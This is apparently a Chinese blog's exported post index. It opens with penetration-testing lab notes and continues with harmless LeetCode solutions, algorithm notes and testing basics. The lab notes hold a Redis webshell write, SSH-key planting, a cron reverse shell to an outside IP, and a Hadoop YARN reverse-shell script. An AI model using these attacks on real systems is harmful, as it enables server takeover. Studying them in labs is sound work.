123456789popen(&quot;whoami&quot;,&#x27;r&#x27;);//不会输出命令的执行结果，且echo也不会输出&lt;?php popen(&quot;whoami &gt; 1.txt&quot;,&quot;r&quot;); // 执行whoami把执行结果导出到1.txt echo file_get_contents(&quot;1.txt&quot;); // 读取1.txt的内容 unlink(&quot;1.txt&quot;); // 删除1.txt?&gt; 命令执行常见特殊字符 12345678cmd1|cmd2：无论cmd1是否执行成功，cmd2将被执行cmd1;cmd2：无论cmd1是否执行成功，cmd2将被执行，windows不支持cmd1||cmd2：仅在cmd1执行失败时才执行cmd2cmd1&amp;&amp;cmd2：仅在cmd1执行成功后cmd2才执行cmd1&amp;cmd2：执行命令1和命令2 cmd2$(cmd) ：echo $(whoami) 或者 $(touch test.sh; echo &#x27;ls&#x27; &gt; test.sh)&#x27;cmd&#x27;：用于执行特定命令，如 &#x27;whoami&#x27; Bash/linux反弹shell 被控端主动发起连接请求去连接控制端，通常被控端由于防火墙限制、权限不足、端口被占用等问题导致被控端不能正常接收发送过来的数据包。 [后续加强] web漏洞扫描工具 XRAY 123456789101112131415161718192021222324# 主动扫描# 完整xray.exe webscan --basic-crawler http://testphp.vulnweb.com/ --html-output vulnweb.com-1.html# 简化xray.exe ws --basic http://testphp.vulnweb.com/ --ho vulnweb.com-2.html# 被动扫描#开启监听# 完整xray.exe webscan --listen 127.0.0.1:7777 --html-output testphp.html# 简化xray.exe ws --listen 127.0.0.1:7777 --ho testphp.html# 浏览器配置代理 HTTP 127.0.0.1 7777# 浏览器访问待测站点，开启扫描# 联合bp扫描# bp配置（Settings -Network -Connections -Upstream Proxy Servers -Add） * 127.0.0.1 7777 None# 若后续无需联动，将勾选取消即可，否则BurpSuite将无法进行抓包与正常访问网站# 监听xray.exe ws --listen 127.0.0.1:7777 --ho test.html# 联合Radxray.exe ws --listen 127.0.0.1:7777 --ho proxy.htmlrad -t http://testphp.vulnweb.com/ --http-proxy 127.0.0.1:7777 Goby https://gobysec.net/features#扫描 https://gobysec.net/features#漏洞 UI界面，直接操作 Nuclei 更新漏洞模板 1nuclei -update-templates 使用 12345678910111213命令行cd目录nuclei.exe//扫描单个目标nuclei -u &lt;url&gt;//扫描多个目标nuclei -l &lt;list.txt&gt;//指定模版扫描,可以是特定的模版文件或是路径nuclei -u &lt;url&gt; -t &lt;poc.yaml/poc_dir&gt;//扫描结果输出nuclei -u &lt;url&gt; -o &lt;results.txt&gt;nuclei -u &lt;url&gt; -o &lt;results.json&gt; -json -irr//调试模版nuclei -u &lt;url&gt; -debug -t &lt;poc.yaml&gt; 未授权访问漏洞 未授权访问漏洞通常指在系统、服务或应用程序中，由于配置不当或安全措施缺失，导致未经过身份验证或授权的用户能够访问敏感资源或执行关键操作。 这可能包括访问数据库、文件系统、管理界面或其他关键组件，从而引发数据泄露、服务中断或系统被恶意利用的风险。 常见未授权访问漏洞 未授权访问服务描述 Redis 是一个开源的内存数据结构存储系统，未授权访问可能导致数据泄露或代码执行。 Docker 是一个开源的应用容器引擎，配置不当可能导致容器被未授权访问。 MongoDB 是一个NoSQL数据库，未授权访问可能允许攻击者访问或修改数据库内容。 Jenkins 是一个持续集成工具，未授权访问可能导致构建过程被干扰或敏感信息泄露。 Memcached 是一个高性能的分布式内存缓存系统，未授权访问可能导致缓存数据泄露。 JBOSS 是一个开源的应用服务器，未授权访问可能导致服务器被控制。 VNC 是一个远程桌面协议，未授权访问可能导致攻击者远程控制目标系统。 ZooKeeper 是一个分布式协调服务，未授权访问可能导致服务中断或数据不一致。 Rsync 是一个文件同步和传输工具，未授权访问可能导致数据泄露。 Atlassian Crowd 是一个身份和访问管理应用程序，未授权访问可能导致账户信息泄露。 CouchDB 是一个面向文档的NoSQL数据库，未授权访问可能导致数据泄露。 Elasticsearch 是一个基于Lucene的搜索引擎，未授权访问可能导致敏感数据被搜索和访问。 Hadoop 是一个开源的分布式存储和计算框架，未授权访问可能导致数据泄露或计算资源 被滥用。 Jupyter Notebook 是一个交互式计算笔记本，未授权访问可能导致代码执行或数据泄露。 防范 定期更新和打补丁：确保所有系统和应用程序都安装了最新的安全补丁。 强化配置管理：审查和更新配置文件，确保只有授权用户才能访问敏感资源。 使用强密码和多因素认证：增加账户安全性，防止密码被破解。 限制网络暴露：确保敏感服务不在公网上暴露，使用防火墙和网络安全组来限制访问。 监控和日志记录：实施监控系统以检测异常行为，并保留日志以便于事后分析。 安全审计和测试：定期进行安全审计和渗透测试，以发现和修复潜在的安全漏洞。 Redis未授权访问 漏洞发现 端口 服务默认端口 默认端口 Redis 6379 MongoDB 27017 Memcached 11211 Jboss 8080 VNC 5900、5901 Docker 2375 端口探测 nmap + TxPortMap.exe 123456789nmap -v -Pn -p [port] -sV [IP]-v：显示详细的扫描过程，包括扫描进度和统计信息。-Pn：跳过主机发现阶段，直接进行端口扫描，假设目标主机是可达的。-p [port]：指定要扫描的端口，可以是一个或多个端口号，例如-p 6379。-sV：启用服务版本探测，尝试确定运行在开放端口上的应用程序及其版本号。[IP]：目标IP地址。TxPortMap.exe -i 471d973642fe.target.yijinglab.com -p 56802 漏洞利用 redis常用命令 windows: Another Redis Desktop Manager Linux: 12345678910111213141516171819202122232425# 连接到远程Redis服务器：redis-cli -h [hostname] -p [port] -a [password][hostname]：Redis服务器的地址。[port]：Redis服务监听的端口，默认为6379。[password]：Redis服务器的密码。set testkey &quot;Hello World&quot; # 设置键testkey的值为字符串&quot;Hello World&quot;get testkey # 获取键testkey存储的字符串值set score 99 # 设置键score的值为99incr score # 使用INCR命令将score的值增加1get score # 获取键score的内容keys * # 列出当前数据库中所有的键config set dir /home/test # 设置工作目录config set dbfilename redis.rdb # 设置备份文件名config get dir # 检查工作目录是否设置成功config get dbfilename # 检查备份文件名是否设置成功save # 进行一次备份操作，保存数据库到磁盘flushall # 删除所有数据del key # 删除键为key的数据 利用方法 1.通过redis数据备份功能结合WEB服务，往WEB网站根目录写入一句话木马，从而得到WEB网站权限 2.通过redis数据备份功能写定时任务，通过定时任务反弹Shell 3.通过redis数据备份功能写SSH公钥，实现免密登录linux服务器 主从复制RCE 如果把数据存储在单个Redis的实例中，当读写数据量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。Redis的主从复制功能允许从服务器同步主服务器的数据。然而，在Redis4.x及以后的版本中，引入的模块功能可能被滥用来实现远程代码执行(RCE): 1.模块功能滥用：攻击者通过上传恶意的Redis模块(.so文件)，并利用Redis的MODULE LOAD命令加载该模块。 2.远程代码执行：加载的恶意模块可能包含用C语言编写的代码，该代码在Rdis服务器上执行，允许攻击者执行任意命令。 写webshell 123456789redis-cli -h 471d973642fe.target.yijinglab.com -p 56802config set dir /var/www/htmlconfig set dbfilename shell.phpset x &quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot;save 写ssh私钥 1234567891011121314# 攻击机生成SSH公钥和私钥保存到 /root/.ssh/ 目录ssh-keygen -q -t rsa -f /root/.ssh/id_rsa -N &#x27;&#x27;# 在id_rsa.pub公钥内容前后加入换行符，保存到/tmp/foo.txt文件(echo -e &quot;\\n\\n&quot;; cat ~/.ssh/id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; /tmp/foo.txt # 读取/tmp/foo.txt文件内容，存入redis中cat /tmp/foo.txt | redis-cli -h 471d973642fe.target.yijinglab.com -p 56802 -x set mredis-cli -h 471d973642fe.target.yijinglab.com -p 56802get mconfig set dir /root/.ssh/config set dbfilename &quot;authorized_keys&quot;savessh root@8063249facec.target.yijinglab.com -p 57181 -i ~/.ssh/id_rsa 写定时任务反弹shell 123456789101112# 写入定时任务redis-cli -h 471d973642fe.target.yijinglab.com -p 56802config set dir /var/spool/cronconfig set dbfilename rootset xxx &quot;\\n\\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/124.71.45.28/4433 0&gt;&amp;1\\n\\n&quot;save# nc监听端口，等待反弹shellnc -lnvp 4433 主从复制RCE 123# 脚本cd RabRpython redis-attack.py -r target.yijinglab.com -p 52257 -L 8.134.220.192 --brute Hadoop未授权访问 漏洞成因 Hadoop YARN(Yet Another Resource Negotiator)是Hadoop:生态系统中的集群资源管理器，负责协调集群中的计算资源和调度作业。然而，YARN的某些配置可能存在安全漏洞： 1.默认开放的REST API端口：YARN的REST API默认开放在8088和8090端口，如果未进行适当的访问控制，攻击者可以利用这些AP进行未授权访问。 2.配置不当：如果YARN的配置文件（如yarm-site.xml)未正确设置访问控制和认证机制，可能导致攻击者能够绕过安全措施。 3.权限过大：如果YARN的某些用户或服务被授予过高的权限，攻击者可能利用这些权限执行恶意操作。 4.服务漏洞：YARN的某些服务可能存在已知漏洞，攻击者可以利用这些漏洞进行攻击。 防范 1.限制API访问：应该限制对YARN REST AP的访问，只允许特定的IP地址或网络访问这些端口。 2.配置认证机制：启用YARN的认证机制，如Kerberos,确保所有请求都经过认证。 3.权限最小化：遵循最小权限原则，确保用户和服务只拥有完成其任务所需的最小权限。 4.更新和打补丁：定期检查并更新YARN及其依赖的软件，应用安全补丁以修复已知漏洞。 5.监控和审计：实施监控和审计机制，以便及时发现和响应可疑活动。 6.如无必要，关闭Hadoop Web管理页面。 7.开启身份验证，防止未经授权用户访问。 8.设置“安全组”访问控制策略，将Hadoop默认开放的多个端口对公网全部禁止或限制可信任的IP地址才能访问包括8088以及WebUI等相关端口。 利用 脚本 1234567891011121314151617181920212223import requestsimport json# 漏洞目标 URLtarget = &#x27;http://192.168.81.127:8088/&#x27;# 反弹Shell 攻击机IP地址lhost = &#x27;192.168.81.238&#x27;url = f&#x27;&#123;target&#125;ws/v1/cluster/apps/new-application&#x27;resp = requests.post(url).content.decode(&#x27;utf-8&#x27;)resp_json = json.loads(resp)app_id = resp_json[&#x27;application-id&#x27;]url = f&#x27;&#123;target&#125;ws/v1/cluster/apps&#x27;data = &#123; &#x27;application-id&#x27;: app_id, &#x27;application-name&#x27;: &#x27;get-shell&#x27;, &#x27;am-container-spec&#x27;: &#123; &#x27;commands&#x27;: &#123;&#x27;command&#x27;: f&#x27;/bin/bash -i &gt;&amp; /dev/tcp/&#123;lhost&#125;/5566 0&gt;&amp;1&#x27;&#125; &#125;, &#x27;application-type&#x27;: &#x27;YARN&#x27;,&#125;requests.post(url, json=data)","categories":[],"tags":[]},{"title":"Git","slug":"Git","date":"2025-04-25T06:03:36.000Z","updated":"2025-04-25T06:03:37.001Z","comments":true,"path":"2025/04/25/Git/","permalink":"http://example.com/2025/04/25/Git/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"leetcode","slug":"leetcode","date":"2025-03-17T03:03:32.000Z","updated":"2025-03-19T11:17:22.707Z","comments":true,"path":"2025/03/17/leetcode/","permalink":"http://example.com/2025/03/17/leetcode/","excerpt":"","text":"哈希 1.两数之和 快速查找需求 1234567891011121314class Solution&#123;public: vector&lt;int&gt; twoSum(vector&lt;int&gt;&amp; nums,int target)&#123; unordered_map&lt;int,int&gt; hashtable; for(int i=0;i&lt;nums.size();i++)&#123; auto it = hashtable.find(target-nums[i]); if(it !=hashtable.end())&#123; return &#123;i,it-&gt;second&#125;; &#125; hashtable[nums[i]]=i; &#125; return &#123;&#125;; &#125;&#125;; 12345678class Solution: def twoSum(self, nums: List[int], target: int) -&gt; List[int]: hashtable=&#123;&#125; for i in range(len(nums)): if target-nums[i] in hashtable: return [i,hashtable[target-nums[i]]] hashtable[nums[i]] =i return [] 面试题 16.15 珠玑妙算 1234567891011121314151617181920class Solution &#123;public: vector&lt;int&gt; masterMind(string solution, string guess) &#123; int ri= 0,fr=0; int dic[4][2] = &#123;0&#125;; unordered_map&lt;char,int&gt; char_to_index = &#123;&#123;&#x27;R&#x27;,0&#125;,&#123;&#x27;Y&#x27;,1&#125;,&#123;&#x27;G&#x27;,2&#125;,&#123;&#x27;B&#x27;,3&#125;&#125;; for(int i=0;i&lt;4;i++)&#123; char s=solution[i],g = guess[i]; if(s==g) ri++; else&#123; dic[char_to_index[s]][0]++; dic[char_to_index[g]][1]++; &#125; &#125; for(int i=0;i&lt;4;i++) fr+=min(dic[i][0],dic[i][1]); return &#123;ri,fr&#125;; &#125;&#125;; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748# 低效class Solution: def masterMind(self, solution: str, guess: str) -&gt; List[int]: hash_sol,hash_gue = defaultdict(int),defaultdict(int) right,fr=0,0 for i in range(4): if solution[i]==guess[i]: right += 1 else: hash_gue[guess[i]]+=1 hash_sol[solution[i]]+=1 for key in hash_gue: if key in hash_sol: fr += min (hash_sol[key],hash_gue[key]) return [right,fr]# 优化from typing import Listclass Solution: def masterMind(self, solution: str, guess: str) -&gt; List[int]: # 初始化猜中次数和伪猜中次数 corr, err = 0, 0 # 使用列表代替字典，索引对应字符： # 0: &#x27;R&#x27;, 1: &#x27;Y&#x27;, 2: &#x27;G&#x27;, 3: &#x27;B&#x27; # dic[char][0]: solution 中未匹配的字符数量 # dic[char][1]: guess 中未匹配的字符数量 dic = [[0, 0] for _ in range(4)] # 字符到索引的映射 char_to_index = &#123;&#x27;R&#x27;: 0, &#x27;Y&#x27;: 1, &#x27;G&#x27;: 2, &#x27;B&#x27;: 3&#125; # 遍历字符串，统计猜中次数和未匹配字符 for i in range(4): s, g = solution[i], guess[i] if s == g: corr += 1 else: # 更新 solution 中未匹配字符的数量 dic[char_to_index[s]][0] += 1 # 更新 guess 中未匹配字符的数量 dic[char_to_index[g]][1] += 1 # 计算伪猜中次数 for count_sol, count_gue in dic: err += min(count_sol, count_gue) return [corr, err] 1941 检查是否所有字符出现次数相同 1234567891011121314class Solution &#123;public: bool areOccurrencesEqual(string s) &#123; unordered_map&lt;char ,int&gt; hashtable; for (char c :s) hashtable[c]++; int n = hashtable[s[0]]; for(char c :s)&#123; if(hashtable[c]!=n) return false; &#125; return true; &#125;&#125;; 123456789101112131415class Solution: def areOccurrencesEqual(self, s: str) -&gt; bool: hashtable = defaultdict(int) for i in s: hashtable[i]+=1 n = hashtable[s[0]] for i in hashtable: if n!=hashtable[i]: return False return True# 优化class Solution: def areOccurrencesEqual(self, s: str) -&gt; bool: c = Counter(s) return len(set(c.values())) == 1 13 罗马数字转整数 12345678910111213141516171819202122232425class Solution &#123;public: int romanToInt(string s) &#123; unordered_map &lt;char,int&gt; dic = &#123;&#123;&#x27;I&#x27;,1&#125;,&#123;&#x27;V&#x27;,5&#125;,&#123;&#x27;X&#x27;,10&#125;,&#123;&#x27;L&#x27;,50&#125;,&#123;&#x27;C&#x27;,100&#125;,&#123;&#x27;D&#x27;,500&#125;,&#123;&#x27;M&#x27;,1000&#125;&#125;; /* // 使用数组代替 unordered_map更快 int dic[256] = &#123;0&#125;; // ASCII 表大小为 256 dic[&#x27;I&#x27;] = 1; dic[&#x27;V&#x27;] = 5; dic[&#x27;X&#x27;] = 10; dic[&#x27;L&#x27;] = 50; dic[&#x27;C&#x27;] = 100; dic[&#x27;D&#x27;] = 500; dic[&#x27;M&#x27;] = 1000; */ int result = 0; for(int i =0;i&lt;s.length();i++)&#123; if(i!=s.length()-1 &amp;&amp; dic[s[i]]&lt;dic[s[i+1]]) result-=dic[s[i]]; else result+=dic[s[i]]; &#125; return result; &#125;&#125;; 12345678910class Solution: def romanToInt(self, s: str) -&gt; int: dic = &#123;&quot;I&quot;:1,&quot;V&quot;:5,&quot;X&quot;:10,&quot;L&quot;:50,&quot;C&quot;:100,&quot;D&quot;:500,&quot;M&quot;:1000&#125; result = 0 for i in range(len(s)): if i !=len(s)-1 and dic[s[i]] &lt; dic[s[i+1]] : result -= dic[s[i]] else: result += dic[s[i]] return result 3.无重复字符的最长子串 123456789101112131415161718class Solution &#123;public: int lengthOfLongestSubstring(string s) &#123; unordered_set&lt;char&gt; set; int n=s.length(),r=0,ans=0; for(int l = 0;l&lt;n;l++)&#123; if(l!=0)&#123; set.erase(s[l-1]); &#125; while(r&lt;n &amp;&amp; set.count(s[r])==0)&#123; set.insert(s[r]); r++; &#125; ans = max(ans,r-l); &#125; return ans; &#125;&#125;; 12345678910111213class Solution: def lengthOfLongestSubstring(self, s: str) -&gt; int: occ = set() n = len(s) r,ans=0,0 for l in range(n): if l != 0: occ.remove(s[l-1]) while r&lt;n and s[r] not in occ: occ.add(s[r]) r+=1 ans = max (ans,r-l) return ans 动态规划 5.最长回文子串 12345678910111213141516171819class Solution &#123;public: string longestPalindrome(string s) &#123; string result = &quot;&quot;,odd,even; for(int i=0;i&lt;s.length();i++)&#123; odd = expand(s,i,i); even = expand(s,i,i+1); if(odd.length()&gt;result.length()) result = odd; if(even.length()&gt;result.length()) result = even; &#125; return result; &#125; string expand(string s,int l,int r)&#123; while(l&gt;=0 &amp;&amp; r&lt;s.length() &amp;&amp; s[l]==s[r])&#123; l--,r++; &#125; return s.substr(l+1,r-l-1); &#125;&#125;; 1234567891011121314151617181920212223242526272829303132333435363738394041424344class Solution: def longestPalindrome(self, s: str) -&gt; str: n = len(s) if n &lt; 2: return s dp = [[False] * n for _ in range(n)] # 初始化 dp 数组 start, end = 0, 0 # 记录最长回文子串的起始和结束位置 # 单个字符一定是回文 for i in range(n): dp[i][i] = True # 检查长度为 2 的子串 for i in range(n - 1): if s[i] == s[i + 1]: dp[i][i + 1] = True start, end = i, i + 1 # 检查长度大于 2 的子串 for length in range(3, n + 1): # 子串长度从 3 到 n for i in range(n - length + 1): # 子串起始位置 j = i + length - 1 # 子串结束位置 if s[i] == s[j] and dp[i + 1][j - 1]: # 状态转移 dp[i][j] = True if length &gt; (end - start + 1): # 更新最长回文子串 start, end = i, j return s[start:end + 1] # 返回最长回文子串//优化class Solution: def longestPalindrome(self, s: str) -&gt; str: def max_hw(l:int, r:int) -&gt; str : while l&gt;=0 and r&lt;len(s) and s[l] == s[r]: l -= 1 r += 1 return s[l+1:r] result = s[0] for i in range(len(s)): odd = max_hw(i,i) even = max_hw(i,i+1) result = max(result,odd,even,key=len) return result 509.斐波那契数 1234567891011121314class Solution &#123;public: int fib(int n) &#123; int f1=0,f2 =1,temp; if(n==0) return 0; for(int i=0;i&lt;n-1;i++)&#123; temp = f1+f2; f1 = f2; f2 = temp; &#125; return f2; &#125;&#125;; 12345678class Solution: def fib(self, n: int) -&gt; int: f1 ,f2 ,fn = 0,1,1 if n ==0 :return 0 for i in range(n-1): fn = f1 + f2 f1, f2 = f2, fn return fn 300.最长增长子序列 1234567891011121314151617181920212223242526272829303132333435class Solution &#123;public: int lengthOfLIS(vector&lt;int&gt;&amp; nums) &#123; int n = nums.size(); if(n==0) return 0; vector&lt;int&gt; dp(n,1); for(int i=1;i&lt;n;i++)&#123; for(int j=0;j&lt;i;j++)&#123; if(nums[j]&lt;nums[i])&#123; dp[i] = max(dp[i],dp[j]+1); &#125; &#125; &#125; return *max_element(dp.begin(),dp.end()); &#125;&#125;;//优化class Solution &#123;public: int lengthOfLIS(vector&lt;int&gt;&amp; nums) &#123; if(nums.empty()) return 0; vector&lt;int&gt; dp; for(int num:nums)&#123; auto it = lower_bound(dp.begin(),dp.end(),num); if(it == dp.end())&#123; dp.push_back(num); &#125; else&#123; *it = num; &#125; &#125; return dp.size(); &#125;&#125;; 1234567891011121314151617181920212223242526class Solution: def lengthOfLIS(self, nums: List[int]) -&gt; int: if not nums: return 0 n = len(nums) dp = [1]*n for i in range(1,n): for j in range(i): if nums[j]&lt;nums[i]: dp[i] = max(dp[i],dp[j]+1) return max(dp)# 优化：二分查找class Solution: def lengthOfLIS(self, nums: List[int]) -&gt; int: if not nums: return 0 dp = [] # 用于存储递增子序列 for num in nums: # 使用二分查找找到插入位置 pos = bisect.bisect_left(dp, num) if pos == len(dp): dp.append(num) # 如果 num 大于所有元素，直接添加到末尾 else: dp[pos] = num # 否则替换掉第一个大于等于 num 的元素 return len(dp) # dp 的长度即为最长递增子序列的长度 72.编辑距离 123456789101112131415161718192021class Solution &#123;public: int minDistance(string word1, string word2) &#123; int n1 = word1.length(), n2 = word2.length(); if(n1*n2==0) return n1+n2; vector&lt;vector&lt;int&gt;&gt; dp(n1+1,vector&lt;int&gt;(n2+1)); for(int i=0;i&lt;n1+1;i++) dp[i][0] = i; for(int j=0;j&lt;n2+1;j++) dp[0][j] = j; for(int i=1;i&lt;n1+1;i++)&#123; for(int j=1;j&lt;n2+1;j++)&#123; if(word1[i-1]==word2[j-1]) dp[i][j]=dp[i-1][j-1]; else dp[i][j]=1+min(&#123;dp[i-1][j],dp[i][j-1],dp[i-1][j-1]&#125;); &#125; &#125; return dp[n1][n2]; &#125;&#125;; 1234567891011121314151617class Solution: def minDistance(self, word1: str, word2: str) -&gt; int: n1, n2 = len(word1), len(word2) if n1*n2 == 0: return n1+n2 dp = [[0]*(n2+1) for _ in range(n1+1)] for i in range(n1+1): dp[i][0]=i for j in range(n2+1): dp[0][j]=j for i in range(1,n1+1): for j in range(1,n2+1): if word1[i-1] == word2[j-1]: dp[i][j] = dp [i-1][j-1] else: dp[i][j] = min(dp[i-1][j],dp[i][j-1],dp[i-1][j-1])+1 return dp[n1][n2] 198.打家劫舍 12345678910111213class Solution &#123;public: int rob(vector&lt;int&gt;&amp; nums) &#123; if(nums.empty()) return 0; int n = nums.size(),dp0=0,dp1=nums[0],temp; for(int i=1;i&lt;n;i++)&#123; temp = max(dp0,dp1); dp1 = dp0 + nums[i]; dp0 = temp; &#125; return max(dp0,dp1); &#125;&#125;; 1234567891011class Solution: def rob(self, nums: List[int]) -&gt; int: n = len(nums) if n ==0 : return 0 dp = [[0]*2 for _ in range(n)] dp[0][1] = nums[0] for i in range(1,n): dp[i][0] = max(dp[i-1][0],dp[i-1][1]) dp[i][1] = dp[i-1][0]+nums[i] return max(dp[n-1][0],dp[n-1][1]) 贪心算法","categories":[],"tags":[]},{"title":"算法","slug":"算法","date":"2025-03-10T08:37:46.000Z","updated":"2025-03-22T03:07:21.098Z","comments":true,"path":"2025/03/10/算法/","permalink":"http://example.com/2025/03/10/%E7%AE%97%E6%B3%95/","excerpt":"","text":"哈希 题目特征 快速查找需求 如判断元素是否存在（重复、交集等），或需要快速查询互补值（如两数之和）。 统计频率/次数 统计字符、数字等的出现次数，例如变位词、多数元素问题。 唯一性/去重问题 如找第一个不重复字符、去重后保留特定顺序等。 映射关系维护 需建立元素间映射（如字符串同构），或记录元素的位置信息（如子数组问题）。 前缀和优化 结合哈希表快速计算子数组和、差值等（如和为K的子数组） 常见解题思路 哈希集合（HashSet） 存储唯一元素，用于去重或存在性判断。 示例题：环形链表、快乐数、数组交集。 哈希映射（HashMap） 记录键值对，存储元素及其索引、频率或其他关联信息。 示例题：两数之和、变位词分组、克隆图的深拷贝。 前缀和 + 哈希表 计算前缀和，用哈希表记录和的出现次数或最早出现位置。 示例题：和为K的子数组、连续数组（0和1数量相等的最长子数组）。 滑动窗口 + 哈希表 维护窗口内元素的哈希统计，用于子串/子数组问题。 示例题：无重复字符的最长子串、最小覆盖子串。 频率统计与比较 用哈希表统计频率后比较（如变位词），或用数组替代哈希优化空间（如仅小写字母的场景）。 优化技巧 数组替代哈希表：若元素范围有限（如字母、固定范围的数字），使用数组更高效。 双向映射：处理同构问题时，需双向检查两个哈希表的映射关系。 延迟更新：在滑动窗口中，可延迟删除哈希表中的元素以简化逻辑（如某些子串问题）。 典型例题 两数之和（HashMap记录值与索引） 无重复字符的最长子串（滑动窗口 + HashMap记录字符最新位置） 字母异位词分组（HashMap以排序后的字符串为Key） 和为K的子数组（前缀和 + HashMap统计和出现次数） 最长连续序列（HashSet快速查找连续元素） 动态规划（DP） 题目特征 最优化问题 如求最大值、最小值、最长/最短路径等。 重叠子问题 问题可以分解为多个子问题，且子问题之间存在重叠（重复计算）。 无后效性 当前状态只与之前的状态有关，而与之后的状态无关。 状态转移 问题可以通过状态转移方程描述，即当前状态由之前的状态推导而来。 常见解题思路 定义状态 明确问题的状态表示，通常用 dp[i] 或 dp[i][j] 表示某种条件下的最优解。 示例： dp[i]：以第 i 个元素结尾的子问题的解（如最长递增子序列）。 dp[i][j]：从位置 (0,0) 到 (i,j) 的解（如网格路径问题）。 状态转移方程 根据问题的逻辑，推导出状态之间的关系。 示例： 斐波那契数列：dp[i] = dp[i-1] + dp[i-2] 最长递增子序列：dp[i] = max(dp[i], dp[j] + 1)，其中 j &lt; i 且 nums[j] &lt; nums[i] 背包问题：dp[i][j] = max(dp[i-1][j], dp[i-1][j-w[i]] + v[i]) 初始化 确定初始状态的值，通常为边界条件。 示例： dp[0] = 0 或 dp[0] = 1（根据问题需求）。 二维 DP 问题中，通常需要初始化第一行和第一列。 计算顺序 按照状态转移方程的逻辑，确定计算顺序（如从左到右、从下到上等）。 返回结果 根据问题需求，返回 dp 数组中的某个值或最大值/最小值。 常见动态规划问题类型 线性 DP 状态定义为一维数组，如斐波那契数列、最长递增子序列、最大子数组和。 二维 DP 状态定义为二维数组，如网格路径问题、编辑距离、最长公共子序列。 背包问题 0-1 背包、完全背包、多重背包等，状态转移涉及容量和物品选择。 区间 DP 状态定义为区间，如石子合并、最长回文子串。 树形 DP 在树结构上进行状态转移，如二叉树中的最大路径和。 状态压缩 DP 通过位运算等技巧压缩状态，减少空间复杂度（如旅行商问题）。 解题步骤总结 分析问题是否满足动态规划的特征（最优化、重叠子问题、无后效性）。 定义状态，明确 dp 数组的含义。 推导状态转移方程，确定如何从子问题推导出当前问题。 初始化 dp 数组，处理边界条件。 按顺序计算 dp 数组，并返回最终结果。 考虑空间优化（如滚动数组）。 优化技巧 空间优化 如果状态转移只依赖于前几个状态，可以用滚动数组或变量代替整个 dp 数组。 示例：斐波那契数列中，只需两个变量 prev 和 curr。 记忆化搜索 在递归中缓存子问题的解，避免重复计算（如自顶向下的 DP）。 预处理 对输入数据进行预处理（如排序），简化状态转移逻辑。 边界条件处理 注意处理边界条件，避免数组越界或逻辑错误。 典型例题 斐波那契数列（线性 DP） 最长递增子序列（线性 DP） 最大子数组和（线性 DP） 编辑距离（二维 DP） 0-1 背包问题（背包 DP） 最长回文子串（区间 DP） 打家劫舍（线性 DP + 空间优化） 三角形最小路径和（二维 DP + 空间优化） 贪心算法 题目特征 1. 明显的局部最优可推导全局最优 问题可以通过每一步选择当前最优解，最终得到全局最优解。 典型场景：最少操作次数、最大收益、最短时间等最优化问题。 2. 无后效性 当前选择不会影响后续子问题的结构，后续状态仅依赖当前状态。 3. 常见问题类型 区间调度：如最多不重叠活动、合并区间。 分配问题：分糖果、任务调度。 跳跃覆盖：能否到达终点、最少跳跃次数。 数学规律：找零钱（特定面值）、加油站问题。 压缩编码：哈夫曼编码、字符串重构。 常见解题思路 1. 排序 + 贪心遍历 核心：通过排序预处理，使数据满足贪心选择的顺序。 典型例题： 合并区间：按左端点排序，合并右端点连续的区间。 最多不重叠活动：按结束时间排序，选择最早结束的活动。 2. 优先队列（堆）维护当前最优 核心：动态选择当前最优解（如最大值、最小值）。 典型例题： 合并K个有序链表：用小根堆每次取最小节点。 任务调度器：优先处理剩余次数最多的任务，避免冷却时间。 3. 数学性质推导 核心：利用问题中隐藏的数学规律直接决策。 典型例题： 跳跃游戏：维护当前能到达的最远距离，不回溯。 加油站问题：总油量≥0时，必存在解；遍历找到剩余油量最低点的下一个站点。 4. 双向贪心或多次遍历 核心：通过左右两次遍历或前后双指针满足不同条件。 典型例题： 分发糖果：左遍历保证右分高者多，右遍历保证左分高者多。 接雨水：双指针从两端向中间逼近，计算局部凹陷。 优化技巧 1. 排序优化 若问题只需局部有序，可用计数排序或桶排序降低时间复杂度。 示例：任务调度器中按任务频率排序。 2. 空间压缩 用变量替代数组，减少空间复杂度。 示例：跳跃游戏中用 max_reach 替代DP数组。 3. 剪枝策略 提前终止无效遍历。 示例：加油站问题中，若当前油量不足则直接跳到下一个起点。 4. 数学替换 将问题转化为数学公式，避免复杂逻辑。 示例：柠檬水找零问题中，优先用10元找零，减少5元消耗。 易错点与注意事项 贪心策略的证明：必须验证局部最优能推导全局最优（可通过反证法或数学归纳）。 边界条件：如空输入、全零、单元素等情况需特殊处理。 排序规则：区间问题按左端点还是右端点排序，影响贪心逻辑。","categories":[],"tags":[{"name":"算法","slug":"算法","permalink":"http://example.com/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"软件测试","slug":"软件测试","date":"2025-03-10T06:38:09.000Z","updated":"2025-03-16T09:23:21.043Z","comments":true,"path":"2025/03/10/软件测试/","permalink":"http://example.com/2025/03/10/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/","excerpt":"","text":"基础 问题报告单样式 测试计划文档组成 测试工作流程 掌握需求 -&gt;测试计划-&gt;测试用例-&gt;测试执行-&gt;测试报告-&gt;回归测试 测试开始时，须有：1.系统需求说明书文档 2.BUG管理工具的地址和账户 单元测试：在开发阶段进行，验证单个代码单元的正确性。 集成测试：在单元测试之后进行，验证多个模块的协同工作。 系统测试：在集成测试之后进行，验证整个系统的功能和性能。 验收测试：在系统测试之后进行，由客户或最终用户确认系统是否满足需求 名词解释 